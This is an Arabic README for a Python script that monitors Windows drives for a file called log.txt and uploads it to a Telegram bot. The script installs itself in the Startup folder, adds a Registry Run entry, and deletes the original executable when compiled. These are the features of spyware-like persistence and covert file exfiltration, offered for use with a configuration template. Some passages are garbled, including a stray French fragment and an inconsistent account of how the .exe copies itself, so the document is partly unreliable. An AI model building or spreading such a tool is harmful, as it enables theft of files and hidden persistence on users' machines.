# مراقبة الملفات وإرسالها إلى تيليجرام

سكريبت Python يراقب محركات Windows للتغييرات في ملف معين (`log.txt`) ويرسل الإشعارات عبر تيليجرام.

## الميزات

- **مراقبة محركات Windows المحددة** (C:, D:, E:, F:, Z:) للتغييرات
- **كشف أحداث إنشاء وتعديل الملفات** باستخدام `watchdog`
- **إرسال الملف إلى تيليجرام** مع اسم الملف، المسار، والوقت
- **تثبيت ذاتي في startup Windows** - ينسخ نفسه إلى مجلد البداية عند التشغيل لأول مرة
- **معالجة حالات كتابة الملفات** - يعيد المحاولة حتى 5 مرات انتظاراً لاستقرار الملف قبل الإرسال
- **بدائل التوافق** -'entrée Registry Run لل ملفات .exe المركبة

## إصلاح الخلل

كان الكود الأصلي يستخدم نمط `for...else` كان يقوم بالإرجاع مبكراً دون إرسال الملف إذا تغير حجم الملف بعد انتظار الاستقرار (وهذا يحدث عندما يتم كتابة الملفات بنشاط). وقد تم إصلاحه باستخدام علم `stabilized` صريح يعيد المحاولة حتى `MAX_RETRIES` (5) مرات، مما يسمح للملفات التي يتم كتابتها بنشاط في النهاية بإرسالها بمجرد استقرارها.

## المتطلبات الأساسية

- Python 3.x
- الحزم المطلوبة:
  ```bash
  pip install requests watchdog
  ```

## التكوين

حرر `file_detect.py` وحدد إعداداتك:

```python
BOT_TOKEN = "رمز بوابة تيليجرام الخاص بك"
CHAT_ID = "رقم_chat الخاص بك"
TARGET_FILENAME = "log.txt"  # الملف الدقيق للمراقبة
DRIVES = [  # محركات Windows للمراقبة
    r"C:\\",
    r"D:\\",
    r"E:\\",
    r"F:\\",
    r"Z:\\",
]
```

## التثبيت

1. **قم بتشغيل السكريبت مرة واحدة** لتثبيته في قائمة Startup الخاصة بـ Windows:
   ```bash
   python file_detect.py
   ```

2. سيقوم السكريبت بـ:
   - نسخ نفسه إلى `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\file_detect.py`
   - بدء مراقبة المحركات للتغييرات في `log.txt`
   - إرسال إشعارات تيليجرام عند تغيير الملف

3. **للإيقاف عن المراقبة**: اضغط `CTRL+C` في konsol

## كيف يعمل

1. **التثبيت الذاتي**: عند التشغيل الأول، ينسخ السكريبت نفسه إلى مجلد Startup الخاص بـ Windows ليبدأ تلقائياً عند تسجيل الدخول
2. **مراقبة الملفات**: يستخدم `watchdog` لمراقبة المحركات المحددة لأحداث `Created` و `Modified`
3. **فحص استقرار الملف**: قبل الإرسال إلى تيليجرام، ينتظر حتى 2 ثانية ويتحقق مما إذا كان حجم الملف ثابتاً (يعني انتهاء عملية الكتابة)
4. **منطق إعادة المحاولة**: يعيد المحاولة حتى 5 مرات إذا كان الملف لا يزال يتغير
5. **إشعار تيليجرام**: يرسل رسالة تحتوي على تفاصيل الملف، ثم يقوم برفع الملف كوثيقة

## للملفات .exe المركبة

عند ترجمة السكريبت إلى .exe باستخدام PyInstaller:
- ينسخ .exe نفسه إلى Startup كـ `file_detect.py`
- ينشئ مدخل Registry Run: `python.exe "startup_path\file_detect.py"`
- يحذف الملف .exe الأصلي
- عند تسجيل الدخول التالي في Windows، ينشئ مدخل Registry Run تشغيل Python مع نسخة .py، التي تبدأ المراقبة
